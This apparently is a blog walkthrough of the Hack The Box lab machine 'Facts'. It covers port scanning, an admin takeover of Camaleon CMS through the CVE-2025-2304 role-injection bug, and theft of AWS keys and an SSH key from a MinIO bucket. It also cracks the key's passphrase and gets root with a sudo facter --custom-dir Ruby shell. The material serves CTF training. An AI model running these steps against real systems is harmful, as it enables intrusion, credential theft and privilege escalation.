---
date: 2026-06-05T09:51:55-05:00
# description: ""
image: "/images/HTB-Facts/facts.png"
showTableOfContents: true
tags: ["HackTheBox", "Labs", "Linux", "CamaleonCMS", "CVE-2025-2304", "AWS", "S3", "GTFOBins", "Facter"]
categories: ["Red Teaming"]
title: "HTB: Facts"
type: "post"
---


* Platform: Hack The Box
* Link: [Facts](https://app.hackthebox.com/machines/Facts)
* Level: Easy
* OS: Linux
---

# Scanning

```
nmap -p- --open -T4 -sCV -oA nmap/Facts {TARGET_IP}
```

**Results**

```shell
Starting Nmap 7.94SVN ( https://nmap.org ) at 2026-02-03 12:26 CST
Nmap scan report for 10.129.108.147
Host is up (0.11s latency).
Not shown: 52251 closed tcp ports (conn-refused), 13281 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT      STATE SERVICE VERSION
22/tcp    open  ssh     OpenSSH 9.9p1 Ubuntu 3ubuntu3.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 4d:d7:b2:8c:d4:df:57:9c:a4:2f:df:c6:e3:01:29:89 (ECDSA)
|_  256 a3:ad:6b:2f:4a:bf:6f:48:ac:81:b9:45:3f:de:fb:87 (ED25519)

80/tcp    open  http    nginx 1.26.3 (Ubuntu)
|_http-server-header: nginx/1.26.3 (Ubuntu)
|_http-title: Did not follow redirect to http://facts.htb/

54321/tcp open  unknown
| fingerprint-strings: 
|   GenericLines, Help, Kerberos, RTSPRequest, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 400 Bad Request
|     Accept-Ranges: bytes
|     Content-Length: 276
|     Content-Type: application/xml
|     Server: MinIO
|     Strict-Transport-Security: max-age=31536000; includeSubDomains
|     Vary: Origin
|     X-Amz-Id-2: dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8
|     X-Amz-Request-Id: 1890CFE3B41D5153
|     X-Content-Type-Options: nosniff
|     X-Xss-Protection: 1; mode=block
|     Date: Tue, 03 Feb 2026 18:27:10 GMT
|     <?xml version="1.0" encoding="UTF-8"?>
|     <Error><Code>InvalidRequest</Code><Message>Invalid Request (invalid argument)</Message><Resource>/</Resource><RequestId>1890CFE3B41D5153</RequestId><HostId>dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>
|   HTTPOptions: 
|     HTTP/1.0 200 OK
|     Vary: Origin
|     Date: Tue, 03 Feb 2026 18:27:10 GMT
|_    Content-Length: 0
1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
SF-Port54321-TCP:V=7.94SVN%I=7%D=2/3%Time=69823DFE%P=x86_64-pc-linux-gnu%r
SF:(GenericLines,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x
SF:20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Ba
SF:d\x20Request")%r(GetRequest,2B0,"HTTP/1\.0\x20400\x20Bad\x20Request\r\n
SF:Accept-Ranges:\x20bytes\r\nContent-Length:\x20276\r\nContent-Type:\x20a
SF:pplication/xml\r\nServer:\x20MinIO\r\nStrict-Transport-Security:\x20max
SF:-age=31536000;\x20includeSubDomains\r\nVary:\x20Origin\r\nX-Amz-Id-2:\x
SF:20dd9025bab4ad464b049177c95eb6ebf374d3b3fd1af9251148b658df7ac2e3e8\r\nX
SF:-Amz-Request-Id:\x201890CFE3B41D5153\r\nX-Content-Type-Options:\x20nosn
SF:iff\r\nX-Xss-Protection:\x201;\x20mode=block\r\nDate:\x20Tue,\x2003\x20
SF:Feb\x202026\x2018:27:10\x20GMT\r\n\r\n<\?xml\x20version=\"1\.0\"\x20enc
SF:oding=\"UTF-8\"\?>\n<Error><Code>InvalidRequest</Code><Message>Invalid\
SF:x20Request\x20\(invalid\x20argument\)</Message><Resource>/</Resource><R
SF:equestId>1890CFE3B41D5153</RequestId><HostId>dd9025bab4ad464b049177c95e
SF:b6ebf374d3b3fd1af9251148b658df7ac2e3e8</HostId></Error>")%r(HTTPOptions
SF:,59,"HTTP/1\.0\x20200\x20OK\r\nVary:\x20Origin\r\nDate:\x20Tue,\x2003\x
SF:20Feb\x202026\x2018:27:10\x20GMT\r\nContent-Length:\x200\r\n\r\n")%r(RT
SF:SPRequest,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20te
SF:xt/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x2
SF:0Request")%r(Help,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Typ
SF:e:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x
SF:20Bad\x20Request")%r(SSLSessionReq,67,"HTTP/1\.1\x20400\x20Bad\x20Reque
SF:st\r\nContent-Type:\x20text/plain;\x20charset=utf-8\r\nConnection:\x20c
SF:lose\r\n\r\n400\x20Bad\x20Request")%r(TerminalServerCookie,67,"HTTP/1\.
SF:1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/plain;\x20charset=u
SF:tf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Request")%r(TLSSessio
SF:nReq,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type:\x20text/pl
SF:ain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x20Bad\x20Requ
SF:est")%r(Kerberos,67,"HTTP/1\.1\x20400\x20Bad\x20Request\r\nContent-Type
SF::\x20text/plain;\x20charset=utf-8\r\nConnection:\x20close\r\n\r\n400\x2
SF:0Bad\x20Request");
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 143.77 seconds
```


Nmap finds three open ports: `SSH` (22), `http` (80), and `MinIO` (54321). There is also a redirection to `facts.htb`.

> [MinIO](https://www.min.io/) is a storage system compatible with Amazon S3.

```
sudo echo "{IP} facts.htb" | sudo tee -a /etc/hosts
```

# Enumeration

At `http://facts.htb/` we find a web application.

![Facts website](/images/HTB-Facts/facts_website.png)

The `Start Exploring` button leads us to `http://facts.htb/animal-ejected` to a publication page.

![bear post](/images/HTB-Facts/bear_post.png)

Clicking on `Page` leads to `http://facts.htb/page` where we find all the available posts on the website.

![page section](/images/HTB-Facts/page_section.png)

It is also noticeable that the pictures for the different posts are store in `http://facts.htb/randomfacts/`, we are unable to access it. However,
we can download images from the website by visiting a picture's specific address such as `http://facts.htb/randomfacts/animalejected.png`.

![posts pictures](/images/HTB-Facts/posts_pics.png)

![images directory](/images/HTB-Facts/image_dir.png)

Through directory brute forcing we find a login page at `http://facts.htb/admin/login`.

```
gobuster dir -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -u http://facts.htb
```

![admin directory](/images/HTB-Facts/admin_dir.png)

![admin page](/images/HTB-Facts/admin_page.png)

We are able to create an account an login. Camaleon CMS is used here specifically version `2.9.0`.

![camaleonCMS dashboard](/images/HTB-Facts/camaleonCMS_dashboard.png)

Looking for Camaleon CMS vulnerabilities, we find [CVE-2025-2304](https://www.tenable.com/security/research/tra-2025-09). It is a privilege escalation vulnerability via mass assignment. It happens when a user tries to change its password. By submitting a request including the `role` parameter we are able to gain admin privileges. 

> Go to your profile page to see the option.

![change password feature](/images/HTB-Facts/change_pwd.png)

The issue resides in the `UsersController` more precisely the `updated_ajax` action during password changes. The vulnerable code uses the `permit!` method which is dangerous because it tells the system to accept every key inside the `password[...]` object. 

Because the parameters are passed directly into `@user.update(...)`, any injected field becomes a writable user attribute and since `role` controls a user privileges we only need to include `password[role]=admin` in order to obtain admin privileges.

> The specific PR is available [here](https://github.com/owen2345/camaleon-cms/pull/1109/changes).

![PR_1109 CamaleonCMS](/images/HTB-Facts/PR_1109.png)

> A PoC of the exploit is available [here](https://github.com/whiteov3rflow/CVE-2025-2304-POC), it automates the process.

![admin access](/images/HTB-Facts/admin_access.png)

# Initial Foothold

After logging out and logging in again we now have access to more functionalities.

![true admin access](/images/HTB-Facts/true_admin.png)

In `Settings` -> `General Site` -> `Filesystem Settings` we find some AWS secrets.

![AWS Secrets](/images/HTB-Facts/AWS_secrets.png)

Using them we enumerate the S3 bucket.

```
aws configure --profile facts
```

![AWS Enumeration](/images/HTB-Facts/AWS_enum_setup.png)

There are two directories in the bucket.

```
aws --profile facts \
    --endpoint-url http://facts.htb:54321 \
    s3 ls
```

![AWS buckets](/images/HTB-Facts/bucket_dirs.png)

We already know that `randomfacts` contains the pictures of the website. So we check `internal`.

```
aws --profile facts \
    --endpoint-url http://facts.htb:54321 \
    s3 ls s3://internal
```

![AWS internal directories](/images/HTB-Facts/internal_dir_S3.png)

A SSH key is recovered in `.ssh`.

```
aws --profile facts \
    --endpoint-url http://facts.htb:54321 \
    s3 ls s3://internal/.ssh/
```

![SSH key S3](/images/HTB-Facts/S3_ssh_key.png)

We copy the key and use it to login via SSH.

```
aws --profile facts \
    --endpoint-url http://facts.htb:54321 \
    s3 cp s3://internal/.ssh/id_ed25519 ./id_ed25519
```

Modify the file permissions with `chmod 600 id_ed25519`.  Let's try interacting with the key.

```
ssh-keygen -y -f id_ed25519
```

It fails because we still need the passphrase.

![sshkeygen command](/images/HTB-Facts/sshkeygen.png)

We use `ssh2john` to create a suitable hash.

```
/usr/share/john/ssh2john.py id_ed25519 > id_ed25519.txt
```

Then crack it with john and find the passphrase `dragonballz`.

```
john --wordlist=/usr/share/wordlists/rockyou.txt id_ed25519.txt
```

![ssh key passphrase](/images/HTB-Facts/key_pwd_facts.png)

Running `ssh-keygen -y -f id_ed25519` again we discovered that the key belongs to `trivia`.

We can now login via SSH 
```
ssh -i id_ed25519 trivia@facts.htb
```

![trivia SSH login](/images/HTB-Facts/trivia_SSH.png)

The user `trivia` is able to access `william`'s home directory where we find the user flag.

![user flag](/images/HTB-Facts/facts_user.png)

# Privilege Escalation

Running `sudo -l` we notice that `facter` is executable as `root`. On [GTFObins](https://gtfobins.org/gtfobins/facter/) we find a way to exploit the binary. Whenever the binary is run with the `--custom-dir` argument the first ruby file in the directory is executed. We can abuse it to get a shell with root privileges.

![facter binary](/images/HTB-Facts/facter_bin.png)

1. Create a directory
 
```
mkdir /tmp/kscorpio
```

2. Create a ruby file in the directory with the following content `exec "/bin/bash"`

```
nano priv.rb
```

3. Execute `facter`

```
sudo /usr/bin/facter --custom-dir /tmp/kscorpio
```

We then gain root privileges

![root access](/images/HTB-Facts/root_access.png)







